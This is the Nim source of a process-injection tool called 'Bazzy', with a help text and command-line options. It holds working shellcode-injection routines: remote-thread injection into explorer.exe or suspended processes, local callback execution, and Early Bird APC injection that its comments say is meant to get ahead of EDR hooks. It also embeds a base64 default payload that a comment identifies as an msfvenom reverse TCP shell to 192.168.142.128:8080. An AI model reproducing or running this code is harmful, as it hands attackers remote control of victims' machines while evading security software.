import base64, strutils, strformat, os
import parseopt
import createSuspendedProcess
import winim/inc/tlhelp32  # Full import for process enumeration
from winim/lean import OpenProcess, VirtualAllocEx, WriteProcessMemory,
                      CreateRemoteThread, WaitForSingleObject, VirtualAlloc,
                      EnumSystemGeoID, CloseHandle, HANDLE, DWORD, INVALID_HANDLE_VALUE,
                      SIZE_T, LPTHREAD_START_ROUTINE, PAGE_EXECUTE_READWRITE,
                      MEM_COMMIT, MEM_RESERVE, MEM_RELEASE,
                      PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_VM_READ,
                      PROCESS_CREATE_THREAD, GEO_ENUMPROC, PAGE_EXECUTE_READ_WRITE,
                      WAIT_OBJECT_0, WAIT_TIMEOUT, GetLastError, VirtualFreeEx,
                      QueueUserAPC, PAPCFUNC, ULONG_PTR
proc getExplorerPID(): DWORD =
  var 
    processEntry: PROCESSENTRY32W
    hSnapshot: HANDLE
    found = false
  
  # Initialize size of PROCESSENTRY32W
  processEntry.dwSize = sizeof(PROCESSENTRY32W).DWORD
  
  # Create snapshot of current processes
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if hSnapshot == INVALID_HANDLE_VALUE:
    return 0

  # Iterate through processes
  if Process32FirstW(hSnapshot, processEntry):
    var procName = cast[WideCString](addr processEntry.szExeFile[0])
    if ($procName).toLowerAscii() == "explorer.exe":
      result = processEntry.th32ProcessID
      found = true

    if not found:
      while Process32NextW(hSnapshot, processEntry):
        procName = cast[WideCString](addr processEntry.szExeFile[0])
        if ($procName).toLowerAscii() == "explorer.exe":
          result = processEntry.th32ProcessID
          found = true
          break
  
  # Clean up
  CloseHandle(hSnapshot)
  
  if not found:
    return 0

proc injectShellcode(shellcode: openarray[byte], pid: DWORD = 0): void =
    echo ".oO finding PID Oo."
    let targetPID = if pid == 0: getExplorerPID() else: pid
    
    if targetPID == 0:
        echo "Could not find target process."
        return

    # Open process with specific access rights
    let hProcess = OpenProcess(
        PROCESS_VM_OPERATION or PROCESS_VM_WRITE or PROCESS_VM_READ or PROCESS_CREATE_THREAD,
        false,
        targetPID
    )
    
    if hProcess == INVALID_HANDLE_VALUE or hProcess == HANDLE(0):
        echo "Failed to open target process. Error: ", GetLastError()
        return

    # Allocate memory with proper size alignment
    let size = cast[SIZE_T]((shellcode.len + 0xFFF) and not 0xFFF)  # Round up to nearest page
    let memAddress = VirtualAllocEx(
        hProcess,
        nil,
        size,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )

    if memAddress == nil:
        echo "Failed to allocate memory in target process. Error: ", GetLastError()
        CloseHandle(hProcess)
        return

    # Write shellcode into allocated memory
    echo ".oO injecting the code Oo."
    var bytesWritten: SIZE_T
    let writeResult = WriteProcessMemory(
        hProcess,
        memAddress,
        unsafeAddr shellcode[0],
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    if writeResult == 0:
        echo "Failed to write shellcode into target process. Error: ", GetLastError()
        VirtualFreeEx(hProcess, memAddress, size, MEM_RELEASE)
        CloseHandle(hProcess)
        return

    echo "Wrote ", bytesWritten, " bytes of ", shellcode.len, " total bytes"

    # Create a remote thread in the target process to execute the shellcode
    echo ".oO executing the code Oo."
    var threadId: DWORD
    let hThread = CreateRemoteThread(
        hProcess, 
        nil, 
        0, 
        cast[LPTHREAD_START_ROUTINE](memAddress), 
        nil, 
        0, 
        addr threadId
    )

    if hThread == HANDLE(0):
        echo "Failed to create remote thread. Error: ", GetLastError()
    else:
        echo "Shellcode injected successfully! Thread ID: ", threadId
        let waitResult = WaitForSingleObject(hThread, 30000)  # Wait up to 30 seconds
        case waitResult
        of WAIT_OBJECT_0:
            echo "Thread completed successfully"
        of WAIT_TIMEOUT:
            echo "Thread execution timed out"
        else:
            echo "Wait failed with error: ", GetLastError()

    # Clean up
    if hThread != HANDLE(0):
        CloseHandle(hThread)
    VirtualFreeEx(hProcess, memAddress, size, MEM_RELEASE)
    CloseHandle(hProcess)

proc executeShellcode(shellcode: openarray[byte]): void =
    echo ".oO Executing the code Oo."

    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    if rPtr == nil:
        echo "Failed to allocate memory for local execution. Error: ", GetLastError()
        return

    # Copy shellcode to the allocated memory section
    copyMem(rPtr, unsafeAddr shellcode[0], cast[SIZE_T](shellcode.len))

    # Callback execution
    EnumSystemGeoID(
        16,
        0,
        cast[GEO_ENUMPROC](rPtr)
    )

proc apcInject(shellcode: openarray[byte], hProcess: HANDLE, hThread: HANDLE): bool =
    # Early Bird APC: queue the shellcode as an APC against the primary thread
    # of a suspended process. When ResumeThread runs, NtTestAlert fires during
    # process init and executes the APC before most user-mode EDR hooks load.
    echo ".oO allocating APC payload memory Oo."

    let size = cast[SIZE_T]((shellcode.len + 0xFFF) and not 0xFFF)
    let memAddress = VirtualAllocEx(
        hProcess,
        nil,
        size,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )

    if memAddress == nil:
        echo "Failed to allocate memory in target process. Error: ", GetLastError()
        return false

    echo ".oO writing shellcode Oo."
    var bytesWritten: SIZE_T
    let writeResult = WriteProcessMemory(
        hProcess,
        memAddress,
        unsafeAddr shellcode[0],
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    if writeResult == 0:
        echo "Failed to write shellcode into target process. Error: ", GetLastError()
        VirtualFreeEx(hProcess, memAddress, size, MEM_RELEASE)
        return false

    echo "Wrote ", bytesWritten, " bytes of ", shellcode.len, " total bytes"

    echo ".oO queueing early bird APC on suspended thread Oo."
    let apcResult = QueueUserAPC(
        cast[PAPCFUNC](memAddress),
        hThread,
        cast[ULONG_PTR](0)
    )

    if apcResult == 0:
        echo "Failed to queue APC. Error: ", GetLastError()
        VirtualFreeEx(hProcess, memAddress, size, MEM_RELEASE)
        return false

    echo "APC queued. Resume will fire NtTestAlert and execute shellcode."
    return true

proc showHelp() =
    echo """
Bazzy - Process Injection Tool

Usage:
    bazzy [options]

Options:
    -h, --help                Show this help
    -p, --payload <base64>    Base64 encoded shellcode payload
    -t, --target <process>    Target process name to spawn from System32
    -e, --execute             Execute shellcode directly (no process injection)
    -a, --apc                 Early Bird APC injection into suspended target
                              (uses -t target, defaults to notepad.exe)

Examples:
    bazzy --payload <base64string>                 # Inject into explorer.exe
    bazzy -p <base64string> -t notepad.exe        # Inject into suspended notepad.exe
    bazzy -p <base64string> -e                    # Execute shellcode directly
    bazzy -p <base64string> -a                    # Early Bird APC into suspended notepad.exe
    bazzy -p <base64string> -a -t calc.exe        # Early Bird APC into suspended calc.exe
    """
    quit(0)

# Main execution
var
    payload = ""
    targetProcess = ""
    executeMode = false
    apcMode = false
    processId: DWORD
    procHandle: HANDLE
    threadHandle: HANDLE

# Parse command line arguments
var p = initOptParser(commandLineParams())
while true:
    p.next()
    case p.kind
    of cmdEnd: break
    of cmdShortOption, cmdLongOption:
        case p.key.toLower()
        of "help", "h": 
            showHelp()
        of "payload", "p":
            p.next()
            if p.kind != cmdArgument:
                echo "Missing value for --payload"
                quit(1)
            payload = p.key
        of "target", "t":
            p.next()
            if p.kind != cmdArgument:
                echo "Missing value for --target"
                quit(1)
            targetProcess = p.key
        of "execute", "e":
            executeMode = true
        of "apc", "a":
            apcMode = true
    of cmdArgument:
        echo "Unknown argument: ", p.key
        showHelp()

# this is msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.142.128 LPORT=8080 -f raw -o reverse.bin
# cat reverse.bin | base64
# Modify payload to be a copy of your base64 encoded shellcode
if payload == "":
    payload = """/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
TTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFY
QVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnl
SbwCAB+QwKiOgEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInC
SP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbqZpXRh/9VIgcRAAgAASbhjbWQAAAAAAEFQQVBI
ieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6
ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlB
idr/1Q==""" 

let decodedData = try:
    decode(payload)
  except CatchableError:
    echo "Invalid base64 payload."
    quit(1)

if decodedData.len == 0:
    echo "Decoded payload is empty."
    quit(1)

var buf = newSeq[byte](decodedData.len)
copyMem(addr buf[0], unsafeAddr decodedData[0], decodedData.len)

# Process injection logic
if executeMode:
    echo ".oO Executing shellcode directly Oo."
    executeShellcode(buf)
elif apcMode:
    # Early Bird APC requires a suspended target — default to notepad.exe
    if targetProcess == "":
        targetProcess = "notepad.exe"
    echo ".oO Early Bird APC mode — spawning suspended target Oo."
    let csp = createSuspendedProcess(
        targetProcess,
        addr processId,
        addr procHandle,
        addr threadHandle
    )

    if csp:
        echo fmt"""
            Process Details:
            ---------------
            PID: {processId}
            Process Handle: {procHandle}
            Thread Handle: {threadHandle}
            """
        if apcInject(buf, procHandle, threadHandle):
            echo ".oO Resuming thread — APC fires now Oo."
            discard resumeThread(threadHandle)
        else:
            echo "[!] APC injection failed; suspended process will exit when bazzy closes"
elif targetProcess != "":
    # Use suspended process injection
    let csp = createSuspendedProcess(
        targetProcess,
        addr processId,
        addr procHandle,
        addr threadHandle
    )

    if csp:
        echo fmt"""
            Process Details:
            ---------------
            PID: {processId}
            Process Handle: {procHandle}
            Thread Handle: {threadHandle}
            """
        echo ".oO injecting thread into suspended process Oo."
        injectShellcode(buf, processId)
        echo ".oO Resuming process Oo."

        discard resumeThread(threadHandle)
else:
    # Default to explorer.exe injection
    echo ".oO Defaulting to explorer.exe injection Oo."
    injectShellcode(buf)